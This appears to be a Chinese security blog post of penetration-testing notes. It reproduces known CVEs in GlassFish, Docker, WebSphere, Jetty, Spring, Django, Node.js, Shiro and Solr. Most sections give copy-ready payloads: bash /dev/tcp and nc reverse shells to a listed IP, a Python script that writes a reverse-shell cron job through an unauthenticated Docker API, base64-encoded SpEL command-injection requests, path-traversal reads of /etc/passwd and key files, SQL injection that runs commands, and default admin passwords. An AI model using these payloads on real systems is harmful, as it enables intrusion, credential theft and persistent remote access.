<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/43.139.157.254/6666 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729192005577.png" alt="image-20230729192005577"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729192412808.png" alt="image-20230729192412808"></p>
<h3 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2017-1000028"><a href="#CVE-2017-1000028" class="headerlink" title="CVE-2017-1000028"></a>CVE-2017-1000028</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile</span><br><span class="line">读windows文件：/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</span><br><span class="line">读linux文件：/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729204553006.png" alt="image-20230729204553006"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230729204615971.png" alt="image-20230729204615971"></p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。（Sandbox又叫沙箱、沙盘，即是一个虚拟系统程序，允许你在沙盘环境中运行浏览器或其他程序，因此运行所产生的变化可以随后删除</span><br></pre></td></tr></table></figure>

<p>1、容器判断：</p>
<p>-是否存在.dockerenv文件</p>
<p>ls -alh &#x2F;.dockerenv</p>
<p>-查询系统进程的cgroup信息：</p>
<p>cat &#x2F;proc&#x2F;1&#x2F;cgroup</p>
<h5 id="Dokcer-未授权漏洞复现"><a href="#Dokcer-未授权漏洞复现" class="headerlink" title="Dokcer 未授权漏洞复现"></a>Dokcer 未授权漏洞复现</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730022154464.png" alt="image-20230730022154464"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=&#x27;http://49.51.95.232:2375/&#x27;)</span><br><span class="line">data = client.containers.run(&#x27;alpine:latest&#x27;, r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc 43.139.157.254 6666 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;, remove=True, volumes=&#123;&#x27;/etc&#x27;: &#123;&#x27;bind&#x27;: &#x27;/tmp/etc&#x27;, &#x27;mode&#x27;: &#x27;rw&#x27;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>获取docker 拉取且正在运行的文件：</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730042516006.png" alt="image-20230730042516006"></p>
<p>查看版本</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730042543244.png" alt="image-20230730042543244"></p>
<p>获取容器的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://121.36.36.99:2375 run -it -v /:/mnt c1aabb73d233 sh //sh 也可以替换为sh</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730043236878.png" alt="image-20230730043236878"></p>
<p>将 <code>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/43.139.157.254/44444 0&gt;&amp;1</code> 写入 root 文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh 0&lt; /tmp/backpipe | nc 43.139.157.254 4444 1&gt; /tmp/backpipe</span><br></pre></td></tr></table></figure>

<h3 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰 富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。</span><br><span class="line">端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口、9060—管理后台访问端口、9043—管理控制台安全端口、8880—SOAP连接器端口等等</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2015-7450-反序列化"><a href="#CVE-2015-7450-反序列化" class="headerlink" title="CVE-2015-7450 反序列化"></a>CVE-2015-7450 反序列化</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730170022807.png" alt="image-20230730170022807"></p>
<p>梭哈~~</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730170226243.png" alt="image-20230730170226243"></p>
<h5 id="后台弱口令Getshell"><a href="#后台弱口令Getshell" class="headerlink" title="后台弱口令Getshell"></a>后台弱口令Getshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-在6.x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。</span><br><span class="line">-websphere/ websphere</span><br><span class="line">-system/ manager</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730171048518.png" alt="image-20230730171048518"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730171342242.png" alt="image-20230730171342242"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730173720624.png" alt="image-20230730173720624"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730174044609.png" alt="image-20230730174044609"></p>
<h3 id="jetty"><a href="#jetty" class="headerlink" title="jetty"></a>jetty</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2021-28164"><a href="#CVE-2021-28164" class="headerlink" title="CVE-2021-28164"></a>CVE-2021-28164</h5><p><code>http://123.58.236.76:63126/%2e/WEB-INF/web.xml</code></p>
<h5 id="CVE-2021-28169"><a href="#CVE-2021-28169" class="headerlink" title="CVE-2021-28169"></a>CVE-2021-28169</h5><p><code>http://123.58.236.76:63126/static?/WEB-INF/web.xml</code></p>
<h5 id="CVE-2021-34429"><a href="#CVE-2021-34429" class="headerlink" title="CVE-2021-34429"></a>CVE-2021-34429</h5><p><code>http://123.58.236.76:63126/%u002e/WEB-INF/web.xml</code></p>
<h2 id="框架安全"><a href="#框架安全" class="headerlink" title="框架安全"></a>框架安全</h2><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><h5 id="cve-2017-4971-Spring-Web-Flow"><a href="#cve-2017-4971-Spring-Web-Flow" class="headerlink" title="cve_2017_4971-Spring Web Flow"></a>cve_2017_4971-Spring Web Flow</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730223926113.png" alt="image-20230730223926113"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730224025003.png" alt="image-20230730224025003"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730224300344.png" alt="image-20230730224300344"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时抓包，抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：</span><br><span class="line"></span><br><span class="line">_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/43.139.157.254/6666+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730225927430.png" alt="image-20230730225927430"></p>
<h5 id="CVE-2022-22963-Spring-Cloud-Function-Spel"><a href="#CVE-2022-22963-Spring-Cloud-Function-Spel" class="headerlink" title="CVE-2022-22963 Spring Cloud Function Spel"></a>CVE-2022-22963 Spring Cloud Function Spel</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</span><br></pre></td></tr></table></figure>

<p>服务启动后，执行<code>curl http://121.36.36.99:8080/uppercase -H &quot;Content-Type: text/plain&quot; --data-binary test</code>即可执行<code>uppercase</code>函数，将输入字符串转换成大写。</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730230953748.png" alt="image-20230730230953748"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730231039016.png" alt="image-20230730231039016"></p>
<p>发送如下数据包，<code>spring.cloud.function.routing-expression</code>头中包含的SpEL表达式将会被执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU3LjI1NC82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730231339670.png" alt="image-20230730231339670"></p>
<h5 id="cve-2018-1273-Spring-Data-Commons"><a href="#cve-2018-1273-Spring-Data-Commons" class="headerlink" title="cve_2018_1273-Spring Data Commons"></a>cve_2018_1273-Spring Data Commons</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</span><br></pre></td></tr></table></figure>

<p>访问<code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730232434210.png" alt="image-20230730232434210"></p>
<p>发包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: 121.36.36.99:8080</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 209</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: http://localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost:8080/users?page=0&amp;size=5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash+-c+&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC80My4xMzkuMTU3LjI1NC82NjY2IDA%2bJjE%3d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730232733325.png" alt="image-20230730232733325"></p>
<h3 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h3><h5 id="cve-2020-17530"><a href="#cve-2020-17530" class="headerlink" title="cve_2020_17530"></a>cve_2020_17530<img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230731000006941.png" alt="image-20230731000006941"></h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230730235953111.png" alt="image-20230730235953111"></p>
<h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2021-3129-RCE"><a href="#CVE-2021-3129-RCE" class="headerlink" title="CVE-2021-3129 RCE"></a>CVE-2021-3129 RCE</h5><p><code>Laravel &lt;= 8.4.2</code></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230731001514720.png" alt="image-20230731001514720"></p>
<h3 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h3><p> 梭哈~~~</p>
<h3 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery"></a>JQuery</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（框架）于2006年1月由John Resig发布</span><br></pre></td></tr></table></figure>

<h5 id="jQuery-Upload-File"><a href="#jQuery-Upload-File" class="headerlink" title="jQuery Upload File &lt;&#x3D; 4.0.2 中的任意文件上传"></a>jQuery Upload File &lt;&#x3D; 4.0.2 中的任意文件上传</h5><p><code>/jquery-upload-file</code></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230731212726166.png" alt="image-20230731212726166"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F &quot;myfile=@php.php&quot; &quot;http://123.58.224.8:55640/jquery-upload-file/php/upload.php&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Node.js是一个基于Chrome V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。</span><br><span class="line">Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。</span><br><span class="line">Systeminformation &lt;  5.3.1</span><br></pre></td></tr></table></figure>

<p>payload </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/getServices?name[]=$(echo -e &#x27;xiaodi&#x27; &gt; test.txt)</span><br></pre></td></tr></table></figure>

<h5 id="cve-2017-14849"><a href="#cve-2017-14849" class="headerlink" title="cve_2017_14849"></a>cve_2017_14849</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /static/../../../a/../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: 121.36.36.99:3000</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230731222446573.png" alt="image-20230731222446573"></p>
<h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。Django采用了MTV的框架模式，即模型M，视图V和模版T，使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能强大的第三方插件，使得Django具有较强的可扩展性。</span><br></pre></td></tr></table></figure>

<h5 id="cve-2019-14234"><a href="#cve-2019-14234" class="headerlink" title="cve_2019_14234"></a>cve_2019_14234</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">单引号已注入成功，SQL语句报错：</span><br><span class="line">/admin/vuln/collection/?detail__a%27b=123</span><br><span class="line">创建cmd_exec：</span><br><span class="line">/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20</span><br><span class="line">调用cmd_exec执行命令：</span><br><span class="line">/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27--%20</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2021-35042"><a href="#CVE-2021-35042" class="headerlink" title="CVE-2021-35042"></a>CVE-2021-35042</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目录：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23</span><br><span class="line">版本：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</span><br><span class="line">数据库名：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%2</span><br></pre></td></tr></table></figure>

<h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p>SSTI</p>
<h3 id="Apache-Shiro"><a href="#Apache-Shiro" class="headerlink" title="Apache Shiro"></a>Apache Shiro</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</span><br><span class="line">判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段</span><br><span class="line">漏洞：https://avd.aliyun.com/search?q=shiro</span><br><span class="line">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</span><br><span class="line">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</span><br><span class="line">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</span><br><span class="line">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</span><br><span class="line">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</span><br><span class="line">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</span><br></pre></td></tr></table></figure>



<h5 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE_2016_4437"></a>CVE_2016_4437</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</span><br><span class="line"></span><br><span class="line">Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</span><br><span class="line"></span><br><span class="line">影响版本 Shiro &lt;= 1.2.4</span><br></pre></td></tr></table></figure>



<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230802134517344.png" alt="image-20230802134517344"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230802134652720.png" alt="image-20230802134652720"></p>
<h5 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h5><p>影响范围：Apache Shiro &lt; 1.7.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc：/admin/%20</span><br></pre></td></tr></table></figure>



<h5 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h5><p>影响范围：Apache Shiro &lt; 1.5.3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poc：/xxx/..;/admin/</span><br></pre></td></tr></table></figure>



<h3 id="Apache-Solor"><a href="#Apache-Solor" class="headerlink" title="Apache Solor"></a>Apache Solor</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。</span><br><span class="line">漏洞：https://avd.aliyun.com/search?q=solr</span><br><span class="line">远程命令执行RCE（CVE-2017-12629）</span><br><span class="line">远程命令执行XXE（CVE-2017-12629）</span><br><span class="line">任意文件读取AND命令执行（CVE-2019-17558）</span><br><span class="line">远程命令执行漏洞(CVE-2019-0192)</span><br><span class="line">远程命令执行漏洞(CVE-2019-0193)</span><br><span class="line">未授权上传漏洞(CVE-2020-13957)</span><br><span class="line">Apache Solr SSRF (CVE-2021-27905)</span><br></pre></td></tr></table></figure>

<h5 id="CVE-2017-12629-远程命令执行RCE"><a href="#CVE-2017-12629-远程命令执行RCE" class="headerlink" title="CVE-2017-12629 (远程命令执行RCE)"></a>CVE-2017-12629 (远程命令执行RCE)</h5><p>影响版本：Apache solr&lt;7.1.0版本</p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230802140202252.png" alt="image-20230802140202252"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1[出自:jiwo.org]</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>然后进行update操作，触发刚才添加的listener：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/update HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</span><br></pre></td></tr></table></figure>



<h5 id="CVE-2019-17558（任意文件读取AND命令执行）"><a href="#CVE-2019-17558（任意文件读取AND命令执行）" class="headerlink" title="CVE-2019-17558（任意文件读取AND命令执行）"></a>CVE-2019-17558（任意文件读取AND命令执行）</h5><p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230802203424547.png" alt="image-20230802203424547"></p>
<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230802203415896.png" alt="image-20230802203415896"></p>
